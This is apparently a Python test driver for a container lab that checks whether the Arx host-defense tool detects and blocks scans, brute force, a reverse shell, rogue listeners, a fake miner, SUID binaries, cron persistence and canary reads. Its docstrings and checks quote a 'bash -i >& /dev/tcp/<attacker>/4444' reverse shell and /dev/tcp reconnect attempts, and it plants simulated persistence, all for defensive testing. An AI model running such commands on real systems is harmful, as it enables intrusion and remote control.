#!/usr/bin/env python3
"""Driver del mini-lab Arx — corre DENTRO del contenedor víctima.

Modos (los orquesta lab/docker-lab.sh con un contenedor atacante separado):
  prep              learn ×2 + seal + canario + listeners señuelo 9001-9012
  net-scan <ip>     L1: verifica detección del escaneo y bloqueo nft de la IP
  release           libera los bloqueos Tier 1 (entre fases de red)
  net-brute <ip>    L2: verifica detección de fuerza bruta y bloqueo nft
  net-revsh <ip>    L6: detección + canal bloqueado + SOLO el dueño suspendido
  net-revsh-verify <ip>  L6: el canal sigue muerto sin suspensión y la reversión lo revive
  net-tarpit <ip>   Tarpit (Core): estrangula la IP del escaneo en vez de bloquearla
  levels            L4, L5, L7, L8, L9 en la víctima + scoreboard
  all               prep + levels (modo clásico de contenedor único)

Cada modo imprime [PASS]/[FAIL] por nivel y sale != 0 si falla.
"""
import json
import os
import signal
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/src/src")
os.environ["PYTHONPATH"] = "/src/src"  # los subprocesos `arx ...` heredan esto
os.environ.setdefault("ARX_CONFIG_DIR", "/work/labcfg")
os.environ.setdefault("ARX_STATE_DIR", "/work/labstate")

from arx import config  # noqa: E402

score = []


def report(level, ok, evidence):
    score.append(ok)
    print(f"[{'PASS' if ok else 'FAIL'}] nivel {level}: {evidence}")
    if not ok:  # un FAIL debe explicarse solo: así se distinguió B9 de un problema de reloj
        print(f"  acciones Tier 1 en la última hora: "
              f"{len(config.read_json(config.state_dir() / 'tier1_actions.json', []))}")
        for i in incidents()[-6:]:
            print(f"  · {(i.get('detail') or '')[:70]} => {(i.get('status') or '')[:70]}")


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=isinstance(cmd, str),
                          capture_output=True, text=True, **kw)


def arx(*args):
    r = sh([sys.executable, "-m", "arx.cli", *args])
    return (r.stdout or "") + (r.stderr or "")


def incidents():
    try:
        lines = (config.state_dir() / "incidents.jsonl").read_text().splitlines()
    except OSError:
        return []
    out = []
    for line in lines:
        try:
            out.append(json.loads(line))
        except ValueError:
            pass
    return out


def sweep():
    return arx("guard", "--once", "--enforce")


def _nft_set(name):
    return sh(["nft", "list", "set", "inet", "arx", name]).stdout


def prep():
    config.write_json(config.config_dir() / "config.json",
                      {"llm_daily_budget": 0, "lab": True})
    print("── preparación: verificar listeners 9001-9012 + learn ×2 + seal + canario ──")
    # Los listeners se siembran en el entrypoint del contenedor (docker exec mata el
    # árbol de procesos al salir — B7). Aquí se VERIFICA, con honestidad si faltan.
    dead = [p for p in range(9001, 9013)
            if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(("127.0.0.1", p)) != 0]
    if dead:
        print(f"listeners señuelo caídos: {dead} — deben nacer en el entrypoint")
        return 1
    arx("learn")
    arx("learn")
    out = arx("learn", "--seal")
    assert "sellad" in out.lower() or "seal" in out.lower(), f"seal falló: {out}"
    print(arx("canaries", "plant").strip()[:120])
    return 0


def net_scan(ip):
    sweep()
    found = any("escaneo desde" in i.get("detail", "") and ip in i.get("detail", "")
                for i in incidents())
    blocked = ip in _nft_set("block_ipv4")
    ok = found and blocked
    print(f"[{'PASS' if ok else 'FAIL'}] nivel 1: escaneo detectado={found} · "
          f"IP en block_ipv4={blocked}")
    return 0 if ok else 1


def release():
    """Libera los bloqueos Tier 1 activos (como si hubieran expirado) entre fases."""
    from datetime import datetime, timedelta, timezone
    from arx.modules import response
    later = datetime.now(timezone.utc) + timedelta(minutes=61)
    n = len(response.expire_blocks(now=later))
    print(f"── bloqueos Tier 1 liberados entre fases: {n} ──")
    return 0


def net_brute(ip):
    sweep()
    found = any("fallos de autenticación desde" in i.get("detail", "")
                and ip in i.get("detail", "") for i in incidents())
    blocked = ip in _nft_set("block_ipv4")
    ok = found and blocked
    print(f"[{'PASS' if ok else 'FAIL'}] nivel 2: fuerza bruta detectada={found} · "
          f"IP en block_ipv4={blocked}")
    return 0 if ok else 1


C2_PORT = 4444


def _c2_conns(ip):
    from arx.modules import recon
    return [c for c in recon.connection_owners()
            if c.get("remote_ip") == ip and c.get("remote_port") == C2_PORT
            and c.get("state") == "ESTABLISHED"]


def _proc_state(pid):
    return sh(["ps", "-o", "stat=", "-p", str(pid)]).stdout.strip()


def _wait_file(path, seconds):
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        if os.path.exists(path):
            return True
        time.sleep(0.25)
    return os.path.exists(path)


def net_revsh(ip):
    """L6, fase 1: `bash -i >& /dev/tcp/<atacante>/4444` lanzado por docker-lab.sh.

    Pasa si la orden previa del atacante se ejecutó (el shell es real), Arx lo detecta,
    el canal queda en c2_out4, el dueño queda suspendido y otro bash del host NO (B9).
    """
    owner = None
    for _ in range(40):  # esperar a que el socket C2 se establezca (≤10 s)
        owner = next((c["pid"] for c in _c2_conns(ip) if c.get("pid")), None)
        if owner:
            break
        time.sleep(0.25)
    if not owner:
        report(6, False, "el reverse shell no llegó a establecer el canal C2")
        return 1
    executed = _wait_file("/tmp/c2-antes", 5)
    bystander = subprocess.Popen(["bash", "-c", "while :; do sleep 1; done"])
    time.sleep(0.5)
    sweep()
    # el incidente se registra con kind="incident"; el tipo del hallazgo va en el detalle
    detected = any("conexión saliente" in i.get("detail", "") and ip in i.get("detail", "")
                   for i in incidents())
    blocked = f"{ip} . {C2_PORT}" in _nft_set("c2_out4")
    suspended = _proc_state(owner).startswith("T")
    bystander_ok = not _proc_state(bystander.pid).startswith("T")
    bystander.kill()
    report(6, executed and detected and blocked and suspended and bystander_ok,
           f"orden previa ejecutada={executed} · detectado={detected} · "
           f"canal bloqueado={blocked} · dueño suspendido={suspended} · "
           f"otro bash intacto={bystander_ok}")
    return 0 if all(score) else 1


def net_revsh_verify(ip):
    """L6, fase 2: el corte es real por sí solo y la reversión lo deshace de verdad.

    Se descongela el shell para probar el canal sin la ayuda de la suspensión: la orden
    enviada tras el bloqueo no debe llegar ni debe poder reconectar. Al expirar, la orden
    retenida debe llegar por retransmisión TCP: esa es la prueba de que es reversible.
    """
    pids = [c["pid"] for c in _c2_conns(ip) if c.get("pid")]
    for pid in pids:
        os.kill(pid, signal.SIGCONT)
    time.sleep(4)
    leaked = os.path.exists("/tmp/c2-despues")
    reconnect = sh(["timeout", "3", "bash", "-c",
                    f"exec 3<>/dev/tcp/{ip}/{C2_PORT}"]).returncode == 0
    release()
    unblocked = f"{ip} . {C2_PORT}" not in _nft_set("c2_out4")
    resumed = _wait_file("/tmp/c2-despues", 30)
    for pid in pids:  # limpieza: el shell del lab no debe seguir vivo en los niveles siguientes
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    report(6, bool(pids) and not leaked and not reconnect and unblocked and resumed,
           f"orden durante el bloqueo llegó={leaked} · reconexión posible={reconnect} · "
           f"bloqueo retirado al expirar={unblocked} · orden retenida llegó tras revertir={resumed}")
    return 0 if all(score) else 1


def net_tarpit(ip):
    """Tarpit (Core): con política ip_response='tarpit', Arx ESTRANGULA la IP del escaneo
    (rate-limit per-IP en nftables) en vez de bloquearla. Pizarra limpia: el tarpit es un
    PRIMER contacto, no una reaparición tras bloqueo. Reutiliza el escaneo real del L1.
    """
    from arx.modules import response
    for path in (response._findings_path(), response._blocks_path(), response._actions_path()):
        config.write_json(path, {} if "findings" in path.name else [])
    cfg = config.load_config()
    cfg["ip_response"] = "tarpit"       # política Core: estrangular, no bloquear
    config.save_config(cfg)
    sweep()
    tarpitted = ip in _nft_set("tarpit4")
    not_blocked = ip not in _nft_set("block_ipv4")
    throttled = "@tarpit4" in sh(["nft", "list", "chain", "inet", "arx", "input"]).stdout
    ok = tarpitted and not_blocked and throttled
    print(f"[{'PASS' if ok else 'FAIL'}] tarpit (Core): estrangulada en tarpit4={tarpitted} · "
          f"NO bloqueada={not_blocked} · reglas rate-limit per-IP activas={throttled}")
    cfg["ip_response"] = "block"        # restaurar el modo por defecto
    config.save_config(cfg)
    release()                            # limpiar el estrangulamiento tras la prueba
    return 0 if ok else 1


def levels():
    canary_path = None
    from arx.modules import canaries
    planted = canaries._load().get("canaries", [])
    if planted:
        canary_path = planted[0]["path"]

    print("\n── nivel 4: listener nuevo (4444) ──")
    sh("nohup nc -l 4444 >/dev/null 2>&1 &")
    time.sleep(1)
    sweep()
    nft = sh(["nft", "list", "set", "inet", "arx", "block_tcp"]).stdout
    ok = any("listen_ports" in i.get("detail", "") and "4444" in i.get("detail", "")
             for i in incidents()) and "4444" in nft
    report(4, ok, f"puerto detectado y bloqueado en nft: {'4444' in nft}")

    print("\n── nivel 5: dropper en /tmp ejecutado ──")
    sh("cp /usr/bin/yes /tmp/miner && chmod +x /tmp/miner")
    proc = subprocess.Popen(["/tmp/miner"], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
    time.sleep(1)
    sweep()
    time.sleep(1)
    try:
        st = sh(["ps", "-o", "stat=", "-p", str(proc.pid)]).stdout.strip()
    except Exception:
        st = "?"
    ok = st.startswith("T")
    report(5, ok, f"/tmp/miner suspendido (estado {st})")

    print("\n── nivel 7: binario SUID nuevo ──")
    sh("cp /usr/bin/id /tmp/sux && chmod u+s /tmp/sux")
    sweep()
    ok = any("suid" in i.get("detail", "").lower() and i.get("sev") in ("crit", "high")
             for i in incidents())
    report(7, ok, "integridad SUID disparó crit")

    print("\n── nivel 8: persistencia en cron.d → autorización → restauración ──")
    sh("echo '* * * * * root /bin/true' > /etc/cron.d/arxevil")
    sweep()
    pend = config.read_json(config.state_dir() / "pending_tier2.json", [])
    # el barrido puede haber encolado otros pendientes antes (p. ej. suid_set del L7):
    # el humano autoriza el de cron, no el primero de la fila
    item_id = next((p["id"] for p in pend
                    if p.get("kind") == "integrity"
                    and (p.get("target") or {}).get("file") == "cron"), None)
    restored, quarantined = False, False
    if item_id:
        from arx.modules import response
        # el humano autoriza (en la CLI real pide la palabra; aquí es el lab)
        item = response.authorize_pending(item_id)
        restored = bool(item and "restaurado" in (item.get("executed") or ""))
        import pathlib
        quarantined = any(p.name.startswith("q-") for p in
                          pathlib.Path(config.state_dir() / "vault").glob("q-*"))
        gone = not os.path.exists("/etc/cron.d/arxevil")
        report(8, restored and quarantined and gone,
               f"restaurado={restored} · hostil en cuarentena={quarantined} · "
               f"fichero hostil fuera de /etc/cron.d={gone}")
    else:
        report(8, False, "no se creó el pendiente Tier 2 de cron")

    print("\n── nivel 9: lectura del señuelo ──")
    if canary_path and os.path.exists(canary_path):
        sh(["cat", canary_path])
        time.sleep(1)
        sweep()
        ok = any(i.get("kind") == "canary" or "canar" in i.get("detail", "").lower()
                 or "señuelo" in i.get("detail", "").lower() for i in incidents())
        report(9, ok, "lectura del canario detectada (atime)")
    else:
        report(9, False, "no se pudo plantar el canario en el lab")

    print(f"\n══ SCOREBOARD: {sum(score)}/{len(score)} niveles superados ══")
    print("(niveles 1, 2 y 6 se validan en la fase de red: ver sus líneas arriba)")
    return 0 if all(score) else 1


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    if mode == "prep":
        return prep()
    if mode == "net-scan":
        return net_scan(sys.argv[2])
    if mode == "release":
        return release()
    if mode == "net-brute":
        return net_brute(sys.argv[2])
    if mode == "net-revsh":
        return net_revsh(sys.argv[2])
    if mode == "net-revsh-verify":
        return net_revsh_verify(sys.argv[2])
    if mode == "net-tarpit":
        return net_tarpit(sys.argv[2])
    if mode == "levels":
        return levels()
    prep()
    return levels()


if __name__ == "__main__":
    sys.exit(main())
